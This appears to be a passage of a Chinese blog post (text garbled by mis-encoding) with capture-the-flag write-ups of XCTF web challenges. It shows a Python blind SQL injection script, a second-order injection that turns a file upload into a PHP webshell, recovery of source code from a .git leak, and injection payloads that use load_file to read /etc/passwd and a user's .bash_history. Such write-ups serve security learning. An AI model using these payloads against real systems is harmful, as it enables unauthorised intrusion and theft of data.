<p>ç™»å…¥æˆåŠŸï¼Œä½†æ˜¯æ‰¾ä¸åˆ°flag</p>
<p>æƒ³åˆ°å‰ä¸‹user.hbm.xmlæ²¡ç”¨åˆ°</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250203135031212.png"
	width="719"
	height="156"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250203135031212_hu3376332785304699892.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250203135031212_hu6106404882861438154.png 1024w"
	loading="lazy"
	
		alt="image-20250203135031212"
	
	
		class="gallery-image" 
		data-flex-grow="460"
		data-flex-basis="1106px"
	
></p>
<p>flagå°±åœ¨æ•°æ®åº“ä¸­ï¼Œ</p>
<p>è¿™é‡Œç”¨å¤§ä½¬ä»¬çš„ç›²æ³¨è„šæœ¬</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">=</span><span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">flag</span><span class="o">=</span><span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">50</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">=</span><span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">255</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;(select%0Aascii(substr(id,&#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;,1))%0Afrom%0AFlag%0Awhere%0Aid&lt;2)&lt;&#39;&#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">j</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;&#39;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="c1">#print payload</span>
</span></span><span class="line"><span class="cl">        <span class="n">url</span><span class="o">=</span><span class="s2">&#34;http://61.147.171.105:53636/zhuanxvlogin?user.name=admin&#39;%0Aor%0A&#34;</span><span class="o">+</span><span class="n">payload</span><span class="o">+</span><span class="s2">&#34;%0Aor%0Aname%0Alike%0A&#39;admin&amp;user.password=1&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="n">r1</span><span class="o">=</span><span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="c1">#print url</span>
</span></span><span class="line"><span class="cl">        <span class="c1">#print len(r1.text)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">r1</span><span class="o">.</span><span class="n">text</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">20000</span> <span class="ow">and</span> <span class="n">p</span><span class="o">!=</span><span class="s1">&#39;&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">flag</span><span class="o">+=</span><span class="n">p</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span> <span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="n">flag</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="cl">        <span class="n">p</span><span class="o">=</span><span class="nb">chr</span><span class="p">(</span><span class="n">j</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å°†payloadä¸­çš„where id&lt;2åˆ é™¤åå†çˆ†ç ´ï¼Œå‘ç°ä¹Ÿèƒ½æˆåŠŸã€‚çŒœæƒ³Flagè¡¨ä¸­åº”è¯¥åªæœ‰ä¸€ä¸ªidåˆ—</p>
<h2 id="filemanager">filemanager
</h2><p>ç›®å½•æ‰«æ</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250203141015130.png"
	width="615"
	height="75"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250203141015130_hu11893036836297420085.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250203141015130_hu10463912168395755350.png 1024w"
	loading="lazy"
	
		alt="image-20250203141015130"
	
	
		class="gallery-image" 
		data-flex-grow="820"
		data-flex-basis="1968px"
	
></p>
<p>æ‰«åˆ°ä¸€ä¸ªå‹ç¼©åŒ…</p>
<p>è™šæ‹Ÿæœºä¸­è§£å‹ç¼©</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250203141244757.png"
	width="643"
	height="486"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250203141244757_hu13320686955636529379.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250203141244757_hu10703848677263460937.png 1024w"
	loading="lazy"
	
		alt="image-20250203141244757"
	
	
		class="gallery-image" 
		data-flex-grow="132"
		data-flex-basis="317px"
	
></p>
<p>æ£€æŸ¥å¥½å‡ ä¸ªphpæ–‡ä»¶æ²¡æœ‰æ–¹å‘</p>
<p>å‘ç°rename.phpé‡Œé¢è¦æ±‚æ–°æ–‡ä»¶å’Œæ—§æ–‡ä»¶çš„æ‹“å±•åè¦ç›¸åŒï¼Œæˆ‘ä»¬æ²¡åŠæ³•æ”¹åç¼€å</p>
<p>ä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡äºŒæ¬¡æ³¨å…¥ï¼Œæ¥ä½¿å¾—å…¶ä¸­è€æ–‡ä»¶çš„æ‹“å±•åä¸ºç©ºï¼Œè¿™æ ·å°±å¯ä»¥ä¿®æ”¹æ‹“å±•åä¸ºphp</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250203143909661.png"
	width="1244"
	height="88"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250203143909661_hu12887275504808613078.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250203143909661_hu12383427742309040749.png 1024w"
	loading="lazy"
	
		alt="image-20250203143909661"
	
	
		class="gallery-image" 
		data-flex-grow="1413"
		data-flex-basis="3392px"
	
></p>
<p>è¿™æ®µoldnameæ˜¯æŸ¥è¯¢æ•°æ®åº“ä¸­çš„filenameï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä¼ å…¥<code>',extension='</code>éšä¾¿ç¬¦åˆæ¡ä»¶çš„åç¼€å</p>
<p>ç„¶åè¿™æ ·æ•°æ®åº“æŸ¥è¯¢oldnameçš„æ—¶å€™å°±ä¼šæœ‰äºŒæ¬¡æ³¨å…¥</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="k">update</span><span class="w"> </span><span class="o">`</span><span class="n">file</span><span class="o">`</span><span class="w"> </span><span class="kt">set</span><span class="w"> </span><span class="o">`</span><span class="n">filename</span><span class="o">`=</span><span class="s1">&#39;shell.txt&#39;</span><span class="p">,</span><span class="w"> </span><span class="o">`</span><span class="n">oldname</span><span class="o">`=</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="n">extension</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="o">`</span><span class="n">fid</span><span class="o">`=</span><span class="err">{$</span><span class="n">result</span><span class="p">[</span><span class="s1">&#39;fid&#39;</span><span class="p">]</span><span class="err">}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™æ ·å°±æ˜¯æ–°æ–‡ä»¶åä¸ºshell.txtç„¶ååç¼€åä¸ºç©º</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250203144300058.png"
	width="616"
	height="102"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250203144300058_hu10560253190142683119.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250203144300058_hu12650125995918739510.png 1024w"
	loading="lazy"
	
		alt="image-20250203144300058"
	
	
		class="gallery-image" 
		data-flex-grow="603"
		data-flex-basis="1449px"
	
></p>
<p>è¿™é‡Œçš„file_existsè¦æ±‚æ•°æ®åº“ä¸­çš„oldnameå­˜åœ¨ï¼Œç”±äºæˆ‘ä»¬æŠŠshell.txtçš„åç¼€åæ”¹ä¸ºç©ºäº†</p>
<p>æˆ‘ä»¬è¦å†ä¸Šä¼ ä¸€ä¸ªåŒæ ·åå­—çš„æ–‡ä»¶ï¼Œæ‰èƒ½ä¿®æ”¹åç¼€åæ¥getshell</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250203144608568.png"
	width="728"
	height="335"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250203144608568_hu815916018958866881.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250203144608568_hu15447398238044087773.png 1024w"
	loading="lazy"
	
		alt="image-20250203144608568"
	
	
		class="gallery-image" 
		data-flex-grow="217"
		data-flex-basis="521px"
	
></p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250203144625067.png"
	width="529"
	height="61"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250203144625067_hu9531982725275530698.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250203144625067_hu6406637426756258138.png 1024w"
	loading="lazy"
	
		alt="image-20250203144625067"
	
	
		class="gallery-image" 
		data-flex-grow="867"
		data-flex-basis="2081px"
	
></p>
<p>è¿™é‡Œè™½ç„¶æ˜¾ç¤ºshell.txt.txtå®é™…ä¸Šæ²¡åç¼€åï¼Œä¸Šä¼ ä¸€ä¸ªåŒ…å«æœ¨é©¬çš„shell.txtï¼Œä¿®æ”¹åç¼€å</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250203144849442.png"
	width="769"
	height="305"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250203144849442_hu955990329086851345.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250203144849442_hu619314597507002325.png 1024w"
	loading="lazy"
	
		alt="image-20250203144849442"
	
	
		class="gallery-image" 
		data-flex-grow="252"
		data-flex-basis="605px"
	
></p>
<p>èšå‰‘è¿æ¥</p>
<h2 id="comment">comment
</h2><p>å‘å¸–æäº¤è¦æ±‚ç™»å…¥</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250203151743482.png"
	width="612"
	height="235"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250203151743482_hu6830841619439594575.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250203151743482_hu14263034426658115957.png 1024w"
	loading="lazy"
	
		alt="image-20250203151743482"
	
	
		class="gallery-image" 
		data-flex-grow="260"
		data-flex-basis="625px"
	
></p>
<p>çˆ†ç ´å¯†ç </p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250203151939328.png"
	width="1904"
	height="1012"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250203151939328_hu15975058566299924181.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250203151939328_hu14522394149914316584.png 1024w"
	loading="lazy"
	
		alt="image-20250203151939328"
	
	
		class="gallery-image" 
		data-flex-grow="188"
		data-flex-basis="451px"
	
></p>
<p>çˆ†å‡ºæ¥666ç™»å…¥</p>
<p>ç›®å½•æ‰«æå‡ºæ¥å¾ˆå¤šgitï¼Œæ€€ç–‘æ˜¯gitæ³„éœ²</p>
<p>ç”¨githackerä¸‹è½½ä¸‹æ¥çš„æºç ä¸å…¨</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">githacker --url http://61.147.171.105:57107/.git --output-folder ./result
</span></span></code></pre></td></tr></table>
</div>
</div><p>æ¥ä¸‹æ¥ä¿®å¤</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">git log --reflog
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250203155053627.png"
	width="1483"
	height="762"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250203155053627_hu16735290816861453862.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250203155053627_hu13987348231357364313.png 1024w"
	loading="lazy"
	
		alt="image-20250203155053627"
	
	
		class="gallery-image" 
		data-flex-grow="194"
		data-flex-basis="467px"
	
></p>
<p>é€‰æ‹©ç¬¬ä¸€ä¸ªæ¢å¤</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">git reset --hard e5b2a2443c2b6d395d06960123142bc91123148c
</span></span></code></pre></td></tr></table>
</div>
</div><p>æŸ¥çœ‹æºç ç¡®å®æ¢å¤äº†</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">include</span> <span class="s2">&#34;mysql.php&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nx">session_start</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;login&#39;</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">&#39;yes&#39;</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Location: ./login.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;do&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl"><span class="k">switch</span> <span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;do&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="k">case</span> <span class="s1">&#39;write&#39;</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$category</span> <span class="o">=</span> <span class="nx">addslashes</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;category&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$title</span> <span class="o">=</span> <span class="nx">addslashes</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;title&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$content</span> <span class="o">=</span> <span class="nx">addslashes</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;content&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;insert into board
</span></span></span><span class="line"><span class="cl"><span class="s2">            set category = &#39;</span><span class="si">$category</span><span class="s2">&#39;,
</span></span></span><span class="line"><span class="cl"><span class="s2">                title = &#39;</span><span class="si">$title</span><span class="s2">&#39;,
</span></span></span><span class="line"><span class="cl"><span class="s2">                content = &#39;</span><span class="si">$content</span><span class="s2">&#39;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$result</span> <span class="o">=</span> <span class="nx">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Location: ./index.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">case</span> <span class="s1">&#39;comment&#39;</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$bo_id</span> <span class="o">=</span> <span class="nx">addslashes</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;bo_id&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;select category from board where id=&#39;</span><span class="si">$bo_id</span><span class="s2">&#39;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$result</span> <span class="o">=</span> <span class="nx">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$num</span> <span class="o">=</span> <span class="nx">mysql_num_rows</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$num</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$category</span> <span class="o">=</span> <span class="nx">mysql_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">)[</span><span class="s1">&#39;category&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$content</span> <span class="o">=</span> <span class="nx">addslashes</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;content&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;insert into comment
</span></span></span><span class="line"><span class="cl"><span class="s2">            set category = &#39;</span><span class="si">$category</span><span class="s2">&#39;,
</span></span></span><span class="line"><span class="cl"><span class="s2">                content = &#39;</span><span class="si">$content</span><span class="s2">&#39;,
</span></span></span><span class="line"><span class="cl"><span class="s2">                bo_id = &#39;</span><span class="si">$bo_id</span><span class="s2">&#39;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$result</span> <span class="o">=</span> <span class="nx">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Location: ./comment.php?id=</span><span class="si">$bo_id</span><span class="s2">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">default</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">    <span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Location: ./index.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Location: ./index.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;insert into comment
</span></span></span><span class="line"><span class="cl"><span class="s2">            set category = &#39;</span><span class="si">$category</span><span class="s2">&#39;,
</span></span></span><span class="line"><span class="cl"><span class="s2">                content = &#39;</span><span class="si">$content</span><span class="s2">&#39;,
</span></span></span><span class="line"><span class="cl"><span class="s2">                bo_id = &#39;</span><span class="si">$bo_id</span><span class="s2">&#39;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$result</span> <span class="o">=</span> <span class="nx">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å½“ç™»å½•åè¦å‘å¸–å­æ—¶å€™ï¼Œæˆ‘ä»¬æ‰§è¡Œçš„sqlè¯­å¥æ˜¯è¿™æ®µï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä¸çœ‹åˆ°æ¯ä¸€æ®µsqléƒ½æ˜¯ç”¨å¦èµ·ä¸€è¡Œï¼Œä¸”å¯ä¸çœ‹åˆ°category å¹¶æ²¡æœ‰è¢«è¿‡æ»¤ï¼Œè€Œä¸”é¡µé¢ä¸Šçš„å¸–å­ï¼Œcontentæ˜¯å¯ä»¥è¢«å›æ˜¾å‡ºæ¥çš„</p>
<p>#åªèƒ½æ³¨é‡ŠåŒä¸€è¡Œï¼Œè€Œè¿™é‡Œéœ€è¦æ³¨é‡Š/**/æ¥è¿›è¡Œä¸¤è¡Œçš„æ³¨é‡Š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;insert into comment
</span></span></span><span class="line"><span class="cl"><span class="s2">            set category = &#39;123&#39;,content=user(),/*&#39;,
</span></span></span><span class="line"><span class="cl"><span class="s2">                content = &#39;*/#&#39;,
</span></span></span><span class="line"><span class="cl"><span class="s2">                bo_id = &#39;</span><span class="si">$bo_id</span><span class="s2">&#39;&#34;</span><span class="p">;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>é‚£ä¹ˆæˆ‘ä»¬ç¬¬ä¸€æ®µä¸º<code>1',content=database(),/*</code>ç¬¬äºŒæ®µä¸º<code>*/#</code>å°±èƒ½æŸ¥è¯¢æ•°æ®åº“å</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250203160832160.png"
	width="717"
	height="79"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250203160832160_hu6287504092867444354.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250203160832160_hu5232769790236290200.png 1024w"
	loading="lazy"
	
		alt="image-20250203160832160"
	
	
		class="gallery-image" 
		data-flex-grow="907"
		data-flex-basis="2178px"
	
></p>
<p>å›æ˜¾ctf</p>
<p>æ¥ä¸‹æ¥çœ‹è¡¨å<code>1',content=(select(group_concat(schema_name))from(information_schema.schemata)),/*</code></p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250203161036047.png"
	width="634"
	height="61"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250203161036047_hu1918205277625606464.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250203161036047_hu13628372249798386516.png 1024w"
	loading="lazy"
	
		alt="image-20250203161036047"
	
	
		class="gallery-image" 
		data-flex-grow="1039"
		data-flex-basis="2494px"
	
></p>
<p>æ¥ä¸‹æ¥å°±æ˜¯åˆ—å</p>
<p><code>1',content=(select(group_concat(table_name))from(information_schema.tables)where((table_schema)=(database()))),/*</code></p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250203161152127.png"
	width="367"
	height="67"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250203161152127_hu1558799381750188929.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250203161152127_hu6194927537855205400.png 1024w"
	loading="lazy"
	
		alt="image-20250203161152127"
	
	
		class="gallery-image" 
		data-flex-grow="547"
		data-flex-basis="1314px"
	
></p>
<p>æ— è®ºå“ªä¸ªå­—æ®µéƒ½æ²¡flag</p>
<p>æ¥ç€æ„é€ payloadï¼š<code>1',content=(select( load_file('/etc/passwd'))),/*</code></p>
<p>æˆ–è€…<code>1',content=((select(load_file(&quot;/etc/passwd&quot;)))),/*</code></p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250203161722006.png"
	width="854"
	height="314"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250203161722006_hu4473716785106606075.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250203161722006_hu7666758868965834360.png 1024w"
	loading="lazy"
	
		alt="image-20250203161722006"
	
	
		class="gallery-image" 
		data-flex-grow="271"
		data-flex-basis="652px"
	
></p>
<p>æœ€åwwwç”¨æˆ·è®¿é—®bin/bashç›®å½•ï¼Œwwwç”¨æˆ·ä½¿ç”¨äº†bashæ“ä½œ</p>
<p>è¯»å–historyå†å²è®°å½•</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="mi">1</span><span class="s1">&#39;,content=((select(load_file(&#34;/home/www/.bash_history&#34;)))),/*</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250203162232672.png"
	width="750"
	height="71"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250203162232672_hu17603500007070334103.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250203162232672_hu4412026137326265714.png 1024w"
	loading="lazy"
	
		alt="image-20250203162232672"
	
	
		class="gallery-image" 
		data-flex-grow="1056"
		data-flex-basis="2535px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">cd</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span>
</span></span><span class="line"><span class="cl"><span class="n">unzip</span> <span class="n">html</span><span class="o">.</span><span class="n">zip</span>
</span></span><span class="line"><span class="cl"><span class="n">rm</span> <span class="o">-</span><span class="n">f</span> <span class="n">html</span><span class="o">.</span><span class="n">zip</span> 
</span></span><span class="line"><span class="cl"><span class="n">cp</span> <span class="o">-</span><span class="n">r</span> <span class="n">html</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span>
</span></span><span class="line"><span class="cl"><span class="n">cd</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span> 
</span></span><span class="line"><span class="cl"><span class="n">rm</span> <span class="o">-</span><span class="n">f</span> <span class="o">.</span><span class="n">DS_Store</span> 
</span></span><span class="line"><span class="cl"><span class="n">service</span> <span class="n">apache2</span> <span class="n">start</span> 
</span></span></code></pre></td></tr></table>
</div>
